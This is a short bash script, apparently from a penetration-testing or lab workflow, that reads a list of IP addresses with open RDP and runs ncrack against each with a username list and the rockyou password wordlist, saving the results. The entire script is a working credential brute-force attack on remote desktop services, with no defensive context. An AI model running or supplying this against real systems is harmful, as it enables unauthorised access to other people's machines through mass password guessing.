rm -f rdpResults
touch rdpResults
for ip in $(cat ../files/open_rdp); do
	echo $ip
	ncrack -vv -U users.txt -P rockyou.txt rdp://$ip >> rdpResults
done
